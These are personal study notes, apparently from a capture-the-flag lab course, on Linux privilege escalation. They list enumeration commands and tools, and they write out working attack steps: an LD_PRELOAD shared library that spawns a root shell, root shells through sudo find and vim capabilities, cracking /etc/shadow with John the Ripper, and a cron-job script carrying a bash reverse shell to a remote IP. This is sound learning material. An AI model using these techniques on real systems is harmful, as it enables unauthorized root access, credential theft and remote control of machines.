
Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords  
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command


#### enumeration after gaining access to a system

any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

**hostname**  
in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

**uname -a**
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

**/proc/version**
Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

**/etc/issue**
This file usually contains some information about the operating system 

**ps**
- `ps -A`: View all running processes
- `ps axjf`: View process tree
- ps aux: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
**env**
The `env` command will show environmental variables.
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.


**sudo -l**
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo` without having root.

**id**
The `id` command will provide a general overview of the user’s privilege level and group memberships.

**/etc/passwd**
Reading the `/etc/passwd` file can be an easy way to discover users on the system.
cat /etc/passwd | cut -d ":" -f 1

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

cat /etc/passwd  | grep home

**/etc/shadow**
To see password hashes in Linux

**history**
Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

**ifconfig**
information about the network interfaces of the system

**ip route**
which network routes exist.

**netstat**
- `netstat -a`: shows all listening ports and established connections.
- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
- `netstat -l`: list ports in “listening” mode. 
- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
- `netstat -tp`: list connections with the service name and PID information.
- `netstat -i`: Shows interface statistics
- `netstat -ano`: 
- - `-a`: Display all sockets
- `-n`: Do not resolve names
- `-o`: Display timers
- 
**find**
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size

Folders and files that can be written to or executed from:

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

 find files that have the SUID bit set
 
 - `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.


#### Automated Enumeration Tools

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)




The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

  
**Research sources:**  

1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.
3.
**Hints/Notes:**

3. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
4. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
5. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
6. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

somtimes you cant wget because you dont have wrtie perms-got to /tmp


#### Privilege Escalation sudo 
##### Leverage application functions
Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files
(`-f` : specify an alternate ServerConfigFile).

![[Pasted image 20251105201502.png]]

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

##### LD_PRELOAD Privilege Escalation
On some systems, you may see the LD_PRELOAD environment option.
![[Pasted image 20251105201546.png]]
LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.

If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
![[Pasted image 20251105201742.png]]

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`





##### Privilege Escalation example -sudo -l 
![[Pasted image 20251106103246.png]]

**`sudo -l` showed**: `User karen may run (ALL) NOPASSWD: /usr/bin/find`
That means you can run `/usr/bin/find` with **root privileges** (`sudo`) and **without a password**.

The `-exec` primary causes `find` (now running as root) to spawn whatever command you give it. Commands executed by `-exec` inherit the **effective UID** of the `find` process — which is root in this case — so they run as root too.

##### spawning a root shell with find

sudo find / -exec /bin/sh -p \; -quit

#### Privilege Escalation: SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

##### s bit explained
if for example nano has the s bit, when we ru nnano it is run with the privileges of the owner, if its owned by root we will be able to read,edit files that are also owned by root.

##### Privilege Escalation with nano
if nano has the s bit on

#### after Privilege Escelation
##### First Option
 At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.
 
`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

`unshadow passwd.txt shadow.txt > passwords.txt`

john passwords.txt

John the Ripper can return one or several passwords in cleartext.

##### second option
The other option would be to add a new user that has root privileges.
We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![[Pasted image 20251106105507.png]]
![[Pasted image 20251106105551.png|1000]]Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

##### Privilege Escalation with base64 
i want to read the flag file but dont have perms

base64 --encode flag3.txt > endcodedflag.txt
base64 --decode endcodedflag.txt > decodedflag.txt

```
base64 "flag3.txt" | base64 --decode
```



#### Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities.

getcap -r / 2>/dev/null
![[Pasted image 20251106112412.png]]GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

we see vim has the capabilities to perform highprivileges tasks  without needing a higher privilege user.  

search on https://gtfobins.github.io/gtfobins/vim/
well create a shell with vim:
```

./vim -c ':py3 import os; os.setuid(0); os.execv("/bin/sh", ["sh", "-c", "reset; exec sh"])'
```

in the capabilities we saw the vim that has the capabilities is in home thats why we would be running from home/karen to priv esc although there are many vims:

![[Pasted image 20251106160137.png]]

#### Privilege Escalation: Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

cat /etc/crontab
![[Pasted image 20251106164538.png]]
You can see the `backup.sh` script was configured to run every minute and with root privs.

well check if we have write privs to it:

![[Pasted image 20251106164629.png]]

lets make it run a reverse shell:

#!/bin/bash
bash -i >& /dev/tcp/10.10.169.106/6666 0>&1

